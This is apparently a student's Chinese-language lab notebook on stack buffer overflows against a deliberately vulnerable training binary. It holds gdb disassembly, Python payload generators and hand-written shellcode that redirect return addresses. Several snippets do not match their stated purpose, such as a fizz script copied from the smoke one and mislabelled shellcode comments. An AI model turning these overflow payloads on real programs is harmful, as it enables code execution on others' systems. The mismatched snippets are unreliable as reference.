# 缓冲区溢出实验笔记

## 编译配置

首先编译的时候要开启全栈可运行，关闭PIE动态编译

指令如下:
```bash
gcc -z execstack -no-pie -fno-stack-protector -g -o ${filename} ${filename}.c
```

因为我们首先要保证地址不变，其次要保证栈内的恶意代码是可以运行的。

关闭PIE难度会大大增加，但不是不能做；关闭StackEXE后实验难度飙升至地狱难度,涉及复杂的提权过程。

---

## 一、Smoke函数

### 1. 确定getbuf函数的栈帧结构

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ gdb ./main
```

### 2. 设置断点并运行至断点处

```gdb
(gdb) break getbuf
(gdb) run
```

### 3. 查看反汇编

```gdb
(gdb) disassemble getbuf
```

```assembly
Dump of assembler code for function getbuf:
   0x0000000000401272 <+0>:     push   %rbp
   0x0000000000401273 <+1>:     mov    %rsp,%rbp
   0x0000000000401276 <+4>:     sub    $0x20,%rsp
   0x000000000040127a <+8>:     mov    $0x20,%esi
   0x000000000040127f <+13>:    lea    0xe32(%rip),%rax        # 0x4020b8
   0x0000000000401286 <+20>:    mov    %rax,%rdi
   0x0000000000401289 <+23>:    mov    $0x0,%eax
   0x000000000040128e <+28>:    call   0x401040 <printf@plt>
   0x0000000000401293 <+33>:    lea    -0x20(%rbp),%rax
   0x0000000000401297 <+37>:    mov    %rax,%rdi
   0x000000000040129a <+40>:    call   0x401156 <gets>
   0x000000000040129f <+45>:    mov    $0x1,%eax
   0x00000000004012a4 <+50>:    leave
   0x00000000004012a5 <+51>:    ret
End of assembler dump.
```

#### 代码分析:

我们令RSP = 0

- `push   %rbp` - getbuf先将test()函数的RBP保存到了自己的栈帧中,此时RSP = 0 - 8 = -8
- `mov    %rsp,%rbp` - 随后将RSP放入RBP中(设置新的RBP),此时RBP = -8
- `sub    $0x20,%rsp` - 将Stack Pointer向下移动32字节,开辟了32字节的栈空间,此时RSP = -40
- `lea    -0x20(%rbp),%rax` - RAX中就是buf的起始地址,此时RSP = -8,那么&buf = -40

#### 栈帧梳理:

```
+8     [返回地址]
 0     [起始位置]
-8     [test的旧RBP]
-16    [buf[24~31]]
-24    [buf[16~23]]
-32    [buf[8~15]]
-40    [buf[0~7]]
```

### 4. 编写Payload

由此我们知道了只需要往BUFFER中写入40字节就能覆盖getbuf的所有栈帧,再写入Smoke的地址就OK了,代码如下:

```python
import sys

smoke_addr = 0x40123a

payload = b'A' * 40
payload += smoke_addr.to_bytes(8, byteorder='little')

with open(r'./payload/smoke.bin', 'wb') as f:
    f.write(payload)

print("Payload written to payload.bin")
```

### 5. 运行验证

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ ./main test < ./payload/smoke.bin 
--- calling test()---
Please type a string (< 32 chars):Smoke!: You called smoke()
```

---

## 二、Fizz函数

### 前言

fizz函数有一个参数，我们需要伪造一个参数。

### 1. 查看fizz函数的地址

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ objdump -d main | grep "<fizz>"
00000000004011f0 <fizz>:
```

### 2. 进入main函数的debug模式

```gdb
(gdb) ./main
```

### 3. 查看fizz函数的栈帧

```assembly
Dump of assembler code for function fizz:
   0x00000000004011f0 <+0>:     push   %rbp
   0x00000000004011f1 <+1>:     mov    %rsp,%rbp
   0x00000000004011f4 <+4>:     sub    $0x10,%rsp
   0x00000000004011f8 <+8>:     mov    %edi,-0x4(%rbp)
   0x00000000004011fb <+11>:    mov    0x2e2f(%rip),%eax        # 0x404030 <cookie>
   0x0000000000401201 <+17>:    cmp    %eax,-0x4(%rbp)
   0x0000000000401204 <+20>:    jne    0x401221 <fizz+49>
   0x0000000000401206 <+22>:    mov    -0x4(%rbp),%eax
   0x0000000000401209 <+25>:    mov    %eax,%esi
   0x000000000040120b <+27>:    lea    0xe42(%rip),%rax        # 0x402054
   0x0000000000401212 <+34>:    mov    %rax,%rdi
   0x0000000000401215 <+37>:    mov    $0x0,%eax
   0x000000000040121a <+42>:    call   0x401040 <printf@plt>
   0x000000000040121f <+47>:    jmp    0x401230 <fizz+64>
   0x0000000000401221 <+49>:    lea    0xe50(%rip),%rax        # 0x402078
   0x0000000000401228 <+56>:    mov    %rax,%rdi
   0x000000000040122b <+59>:    call   0x401030 <puts@plt>
   0x0000000000401230 <+64>:    mov    $0x0,%edi
```

#### 代码分析:

我们令RSP = 0

- `push   %rbp` - 同样,保存旧的RBP;RSP = 0 - 8 = -8
- `mov    %rsp,%rbp` - 同样,将RPB更新;RBP = -8
- `sub    $0x10,%rsp` - 开辟一份16字节的空间;RSP = -8 - 16 = -24
- `mov    %edi,-0x4(%rbp)` - 将EDI中的内容放入RBP - 4 = -12中,这里已经可以猜测就是参数val了
- `mov    0x2e2f(%rip),%eax` - (EAX) = cookie
- `cmp    %eax,-0x4(%rbp)` - 这就是if (val == cookie)的判断语句

### 综上我们已经掌握了函数的所有内容:

- RBP - 4: 参数
- EAX: cookie

### 4. 查看getbuf的地址

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ objdump -d main | grep "<getbuf>"
0000000000401272 <getbuf>:
```

### 5. 确认攻击流程

其实我们看了汇编就是知道，程序只知道 RBP-4 存放了参数，所以我们只要让RBP指向 &cookie+4 的位置程序就会以为cookie等于value。

我们得知cookie的地址是0x404030，因此我们需要让RBP=0x404034。

但是fizz函数的汇编告诉我们它一开始会保存旧的RBP(也就是getbuf的)，我们就没法通过修改RBP的值通过val==cookie验证。

但是我们可以直接绕过验证,直接把返回地址设置为0x401206(具体内容见上)，就可以绕过验证了。

### 6. 编写代码

```python
import sys

smoke_addr = 0x40123a

payload = b'A' * 40
payload += smoke_addr.to_bytes(8, byteorder='little')

with open(r'./payload/smoke.bin', 'wb') as f:
    f.write(payload)

print("Payload written to payload.bin")
```

### 7. 验证

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ python3 ./fizz.py
Payload written to payload.bin

┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ ./main test < ./payload/fizz.bin 
--- calling test()---
Please type a string (< 32 chars):Fizz!: You called fizz(0x2d)
```

---

## 三、Bang函数

### 前言

在我们运行程序的时候，其实就算关闭的PIE功能，程序的运行环境不同也会导致栈结构的不同。

在本内容中,我们需要通过修改getbuf函数的返回地址(变为我们的恶意代码的起始地址,许多病毒的基本逻辑)

但是由于环境会发生变化,所以有时候会出现GDB环境下可以运行，但是直接运行会出现segment default或者instruction default。结果如下所示：

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ ./main test < ./payload/bang.bin
--- calling test()---
Segmentation fault

┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ gdb ./main
GNU gdb (Debian 16.3-1) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./main...
(gdb) run test < ./payload/bang.bin
Starting program: /mnt/d/Code/C/VSCode/IOT/main test < ./payload/bang.bin
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
--- calling test()---
Please type a string (< 32 chars):Bang!: You set global_value to 0x2d
[Inferior 1 (process 1032) exited normally]
```
本质原因就是运行环境的不同导致栈帧发生了位移。比如我们在运行gbd的时候gbd加载的是绝对地址，但是./main运行则是相对地址，参数的不同必然是会导致栈帧发生变化的。
因此r.sh就是用来固化环境的脚本,每次运行之前用r.sh固化环境就可以保证栈地址每次运行都是相同的。

#### 参考:

- https://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html
- https://github.com/hellman/fixenv/blob/master/r.sh

### 0. 重新查看buf的起始地址

此部分我们需要重新查看buf的起始地址，因为我们需要固化栈地址来确定到底buf首地址在哪里。

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ ./r.sh gdb ./main
```

```bash
(gdb) disassemble getbuf
```

```asembly
Dump of assembler code for function getbuf:
   0x0000000000401272 <+0>:     push   %rbp
   0x0000000000401273 <+1>:     mov    %rsp,%rbp
   0x0000000000401276 <+4>:     sub    $0x20,%rsp
   0x000000000040127a <+8>:     mov    $0x20,%esi
   0x000000000040127f <+13>:    lea    0xe32(%rip),%rax        # 0x4020b8
   0x0000000000401286 <+20>:    mov    %rax,%rdi
   0x0000000000401289 <+23>:    mov    $0x0,%eax
   0x000000000040128e <+28>:    call   0x401040 <printf@plt>
   0x0000000000401293 <+33>:    lea    -0x20(%rbp),%rax
   0x0000000000401297 <+37>:    mov    %rax,%rdi
   0x000000000040129a <+40>:    call   0x401156 <gets>
   0x000000000040129f <+45>:    mov    $0x1,%eax
   0x00000000004012a4 <+50>:    leave
   0x00000000004012a5 <+51>:    ret
End of assembler dump.
```

```bash
(gdb) break *0x40129a
Breakpoint 1 at 0x40129a: file main.c, line 59.
(gdb) run test < ./payload/bang.bin
Starting program: /mnt/d/Code/C/VSCode/IOT/.launcher test < ./payload/bang.bin
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
--- calling test()---

Breakpoint 1, 0x000000000040129a in getbuf () at main.c:59
59         gets(buf);

(gdb) info registers rax rdi
rax            0x7fffffffd940      140737488345408
rdi            0x7fffffffd940      140737488345408
```

由此我们可以看到buf的起始地址居然变成了0x7fffffffd940（幽默）。

### 1. 查看bang函数的地址

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ objdump -d main | grep "<bang>"
000000000040119e <bang>:
```

### 2. 查看bang反汇编

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ ./r.sh gdb ./main
```

```bash
(gdb) disassemble bang
```

```assembly
Dump of assembler code for function bang:
   0x000000000040119e <+0>:     push   %rbp
   0x000000000040119f <+1>:     mov    %rsp,%rbp
   0x00000000004011a2 <+4>:     sub    $0x10,%rsp
   0x00000000004011a6 <+8>:     mov    %edi,-0x4(%rbp)
   0x00000000004011a9 <+11>:    mov    0x2e99(%rip),%edx        # 0x404048 <global_value>
   0x00000000004011af <+17>:    mov    0x2e7b(%rip),%eax        # 0x404030 <cookie>
   0x00000000004011b5 <+23>:    cmp    %eax,%edx
   0x00000000004011b7 <+25>:    jne    0x4011d7 <bang+57>
   0x00000000004011b9 <+27>:    mov    0x2e89(%rip),%eax        # 0x404048 <global_value>
   0x00000000004011bf <+33>:    mov    %eax,%esi
   0x00000000004011c1 <+35>:    lea    0xe40(%rip),%rax        # 0x402008
   0x00000000004011c8 <+42>:    mov    %rax,%rdi
   0x00000000004011cb <+45>:    mov    $0x0,%eax
   0x00000000004011d0 <+50>:    call   0x401040 <printf@plt>
   0x00000000004011d5 <+55>:    jmp    0x4011e6 <bang+72>
   0x00000000004011d7 <+57>:    lea    0xe52(%rip),%rax        # 0x402030
   0x00000000004011de <+64>:    mov    %rax,%rdi
```

#### 代码分析:

我们令RSP = 0

- `push   %rbp` - 同样,保存旧的RBP;RSP = 0 - 8 = -8
- `mov    %rsp,%rbp` - 同样,将RPB更新;RBP = -8
- `sub    $0x10,%rsp` - 开辟一份16字节的空间;RSP = -8 - 16 = -24
- `mov    %edi,-0x4(%rbp)` - 将EDI中的内容放入RBP - 4 = -12中,这里也是可以猜测就是参数val了
- `mov    0x2e99(%rip),%edx` - (EDX) = global_value
- `mov    0x2e7b(%rip),%eax` - (EAX) = cookie

#### 信息分析:

- &cookie = 0x404030
- &global_value = 0x404048

#### 信息汇总:

- &cookie = 0x404030
- &global_value = 0x404048
- &buf = 0x7fffffffd940
- &bang = 0x40119e

### 3. 编写代码，将cookie的值(0x2d)放入global_value中

```assembly
mov $0x2d, %rdx
mov %rdx, 0x404048
push $0x40119e
ret
```

### 4. 编译后查看机器码

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ gcc -c ./assembly/bang.s -o ./assembly/bang.o

┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ objdump -d ./assembly/bang.o

./assembly/bang.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c2 2d 00 00 00    mov    $0x2d,%rdx
   7:   48 89 14 25 48 40 40    mov    %rdx,0x404048
   e:   00 
   f:   68 9e 11 40 00          push   $0x40119e
  14:   c3                      ret
```

### 5. 编写脚本

```python
import sys

shellcode = b'\x48\xc7\xc2\x2d\x00\x00\x00'  # mov $0x404030,%rdx
shellcode += b'\x48\x89\x14\x25\x48\x40\x40\x00'  # mov %rdx,0x404048
shellcode += b'\x68\x9e\x11\x40\x00'  # push $0x40119e
shellcode += b'\xc3'  # ret

buf_addr = 0x7fffffffd940

buf_size = 32
padding_size = buf_size - len(shellcode)

payload = shellcode
payload += b'A' * padding_size
payload += b'B' * 8
payload += buf_addr.to_bytes(8, byteorder='little')  # 覆盖返回地址

with open(r'./payload/bang.bin', 'wb') as f:
    f.write(payload)

print("Payload written to bang.bin")
```

### 6. 运行

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ ./r.sh ./main test < ./payload/bang.bin
--- calling test()---
Please type a string (< 32 chars):Bang!: You set global_value to 0x2d
```

---

## 四、Boom函数

### 前言

本难度任务就是修复破坏掉的现场，使得程序能够正常返回到test中并且输出“Boom!:  success”

### 1. 查看test函数的反汇编代码

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ gdb ./main
```

```gdb
(gdb) disassemble test
```

```assembly
Dump of assembler code for function test:
   0x00000000004012a6 <+0>:     push   %rbp
   0x00000000004012a7 <+1>:     mov    %rsp,%rbp
   0x00000000004012aa <+4>:     sub    $0x10,%rsp
   0x00000000004012ae <+8>:     mov    $0x0,%eax
   0x00000000004012b3 <+13>:    call   0x401257 <uniqueval>
   0x00000000004012b8 <+18>:    mov    %eax,-0x8(%rbp)
   0x00000000004012bb <+21>:    mov    $0x0,%eax
   0x00000000004012c0 <+26>:    call   0x401272 <getbuf>
   0x00000000004012c5 <+31>:    mov    %eax,-0x4(%rbp)
   0x00000000004012c8 <+34>:    mov    $0x0,%eax
   0x00000000004012cd <+39>:    call   0x401257 <uniqueval>
   0x00000000004012d2 <+44>:    mov    %eax,%edx
   0x00000000004012d4 <+46>:    mov    -0x8(%rbp),%eax
   0x00000000004012d7 <+49>:    cmp    %eax,%edx
   0x00000000004012d9 <+51>:    je     0x4012ec <test+70>
   0x00000000004012db <+53>:    lea    0xdfe(%rip),%rax        # 0x4020e0
   0x00000000004012e2 <+60>:    mov    %rax,%rdi
   0x00000000004012e5 <+63>:    call   0x401030 <puts@plt>
   0x00000000004012ea <+68>:    jmp    0x401321 <test+123>
   0x00000000004012ec <+70>:    mov    0x2d3e(%rip),%eax        # 0x404030 <cookie>
   0x00000000004012f2 <+76>:    cmp    %eax,-0x4(%rbp)
   0x00000000004012f5 <+79>:    jne    0x401308 <test+98>
   0x00000000004012f7 <+81>:    lea    0xe0b(%rip),%rax        # 0x402109
   0x00000000004012fe <+88>:    mov    %rax,%rdi
   0x0000000000401301 <+91>:    call   0x401030 <puts@plt>
   0x0000000000401306 <+96>:    jmp    0x401321 <test+123>
   0x0000000000401308 <+98>:    mov    -0x4(%rbp),%eax
   0x000000000040130b <+101>:   mov    %eax,%esi
   0x000000000040130d <+103>:   lea    0xe05(%rip),%rax        # 0x402119
   0x0000000000401314 <+110>:   mov    %rax,%rdi
   0x0000000000401317 <+113>:   mov    $0x0,%eax
   0x000000000040131c <+118>:   call   0x401040 <printf@plt>
   0x0000000000401321 <+123>:   nop
   0x0000000000401322 <+124>:   leave
   0x0000000000401323 <+125>:   ret
```

#### 代码分析:

- `push   %rbp` - 保存旧的RBP
- `mov    %rsp,%rbp` - 设置新RBP,与当前Stack Pointer相同
- `call   0x401257 <uniqueval>` - 调用uniqueval函数
- `sub    $0x10,%rsp` - RSP向下移动16字节,即开辟16字节空间
- `mov    $0x0,%eax` - EAX清零操作
- `mov    %eax,-0x8(%rbp)` - 将返回值保存到RBP-8的位置,这里大概就是local局部变量的位置了
- `call   0x401272 <getbuf>` - 调用getbuf函数
- `mov    %eax,-0x4(%rbp)` - 将返回值保存到RBP-4的位置,这里大概就是val局部变量的位置了
- `call   0x401257 <uniqueval>` - 调用getbuf函数
- `mov    %eax,%edx` - 返回值(0x11223344)保存到EDX中
- `mov    -0x8(%rbp),%eax` - 将局部变量local的值放在EAX中
- `cmp    %eax,%edx` - 本质上就是分析local的值是否被恶意修改了
- `je     0x4012ec <test+70>` - 相等(没有被修改掉)则跳转
- `mov    0x2d3e(%rip),%eax` - cookie的值放到EAX中
- `cmp    %eax,-0x4(%rbp)` - if (cookie == val)

### 2. 思路分析

到这里我们其实就可以发现只要将EAX中的值修改为cookie其实就没什么问题了。然后就会输出“Boom!:  success”的字符串。

再者,我们32字节的buf覆盖完成之后，由于getbuf先前PUSH了一个RBP，所以这里我们要使用RBP的原来的值进行覆盖(这是最简单的方式,但不是唯一的方式)

然后就是跳转地址,我认为我们可以跳转到 0x4012c5 执行mov %eax,%edx 操作。这样我们的val就被替换成cookie了。

但是！这并不像我们实验报告上写的那么简单！！！

注意：在跳转之后我们还有一个问题,先分析如下代码:

```assembly
call   0x401257 <uniqueval>
mov    %eax,%edx
mov    -0x8(%rbp),%eax
cmp    %eax,%edx
je     0x4012ec <test+70>
```

在真正进入"Boom: success"之前，我们还要解决验证的问题。也就是我们要从-0x8(%rbp)处拿到我们的local数据和真正的local(0x11223344)进行比较

但是我们直接就跳转到了 0x4012c5，根本没有对-0x8(%rbp)进行初始化，因此我们的payload还要对这个地址进行初始化。

也就是说：博客的内容是大错特错的！！！典型的学术垃圾！！！误人子弟！！！

那我们理论存在，实践开始！

### 3. 查看RBP中到存放的信息,得知是0x7fffffffd930

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ gdb ./main
```

```gdb
(gdb) disassemble getbuf
```

```assembly
Dump of assembler code for function getbuf:
   0x0000000000401272 <+0>:     push   %rbp
=> 0x0000000000401273 <+1>:     mov    %rsp,%rbp
   0x0000000000401276 <+4>:     sub    $0x20,%rsp
   0x000000000040127a <+8>:     mov    $0x20,%esi
   0x000000000040127f <+13>:    lea    0xe32(%rip),%rax        # 0x4020b8
   0x0000000000401286 <+20>:    mov    %rax,%rdi
   0x0000000000401289 <+23>:    mov    $0x0,%eax
   0x000000000040128e <+28>:    call   0x401040 <printf@plt>
   0x0000000000401293 <+33>:    lea    -0x20(%rbp),%rax
   0x0000000000401297 <+37>:    mov    %rax,%rdi
   0x000000000040129a <+40>:    call   0x401156 <gets>
   0x000000000040129f <+45>:    mov    $0x1,%eax
   0x00000000004012a4 <+50>:    leave
   0x00000000004012a5 <+51>:    ret
End of assembler dump.
```

```gdb
(gdb) break *0x401273
Breakpoint 1 at 0x401273: file main.c, line 55.
(gdb) run test
(gdb) info registers rbp
rbp            0x7fffffffd930      0x7fffffffd930
```

### 4. 编写恶意代码，并编译，查看机器码

```assembly
movl $0x11223344, %eax
movl %eax, 0x7fffffffd928
movq $0x2d, %rax 
pushq $0x4012c5
ret
```

```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT/assembly]
└─$ gcc -c boom.s -o boom.o

┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT/assembly]
└─$ objdump -d ./boom.o

./boom.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   b8 44 33 22 11          mov    $0x11223344,%eax
   5:   a3 24 d9 ff ff ff 7f    movabs %eax,0x7fffffffd924
   c:   00 00
   e:   48 c7 c0 2d 00 00 00    mov    $0x2d,%rax
  15:   68 c5 12 40 00          push   $0x4012c5
  1a:   c3                      ret
```

### 5. 编写脚本
```python
import sys

shellcode = b'\xb8\x44\x33\x22\x11' # mov $0x11223344,%eax
shellcode += b'\xa3\x28\xd9\xff\xff\xff\x7f\x00\x00' # movabs %eax,0x7fffffffd928
shellcode += b'\x48\xc7\xc0\x2d\x00\x00\x00'  # mov $0x404030,%rdx
shellcode += b'\x68\xc5\x12\x40\x00'  # push   0x4012c5
shellcode += b'\xc3'  # ret

buf_addr = 0x7fffffffd940
RBP_value = 0x7fffffffd980

buf_size = 32
padding_size = buf_size - len(shellcode)

payload = shellcode
payload += b'A' * padding_size
payload += RBP_value.to_bytes(8, byteorder='little')
payload += buf_addr.to_bytes(8, byteorder='little')  # 覆盖返回地址

with open(r'./payload/boom.bin', 'wb') as f:
    f.write(payload)

print("Payload written to boom.bin")
```

### 6. 运行。底下的Segmentation fault不用多管，这是脚本的段错误，不是payload的错误
```bash
┌──(kali㉿ORSTED-LAPTOP)-[/mnt/d/Code/C/VSCode/IOT]
└─$ ./r.sh ./main test < ./payload/boom.bin
--- calling test()---
Please type a string (< 32 chars):Boom!:  success
```